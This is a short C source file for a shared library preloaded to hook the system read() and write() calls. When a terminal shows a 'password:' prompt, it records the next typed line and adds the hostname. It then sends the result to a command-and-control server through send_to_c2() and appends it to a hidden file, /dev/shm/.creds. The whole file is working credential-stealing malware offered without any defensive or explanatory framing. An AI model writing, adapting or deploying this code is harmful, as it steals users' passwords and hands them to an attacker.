#define _GNU_SOURCE
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>
#include <dlfcn.h>

void send_to_c2(const char* data);

static int capturing = 0;
static char password[128];
static int pos = 0;

ssize_t (*original_read)(int fd, void *buf, size_t count) = NULL;
ssize_t (*original_write)(int fd, const void *buf, size_t count) = NULL;


ssize_t write(int fd, const void *buf, size_t count) {
    if (!original_write)
        original_write = dlsym(RTLD_NEXT, "write");

    if (isatty(fd) && strstr(buf, "password:"))
        capturing = 1;

    return original_write(fd, buf, count);
}

ssize_t read(int fd, void *buf, size_t count) {
    if (!original_read)
        original_read = dlsym(RTLD_NEXT, "read");

    ssize_t ret = original_read(fd, buf, count);


    if (capturing && isatty(fd)) {
        for (ssize_t i = 0; i < ret; i++) {
            if (((char*)buf)[i] == '\n') {
                password[pos] = '\0';
                char host[128];
                gethostname(host, sizeof(host));
                char msg[512];
                snprintf(msg, sizeof(msg), "register %s %s", host, password);
		send_to_c2(msg);
		FILE *fp = fopen("/dev/shm/.creds", "a");  
		if (fp) {
		    fprintf(fp, "%s\n", msg);
		    fclose(fp);
}

pos = 0;
memset(password, 0, sizeof(password));
capturing = 0;

            } else if (pos < sizeof(password) - 1) {
                password[pos++] = ((char*)buf)[i];
            }
        }
    }

    return ret;
}
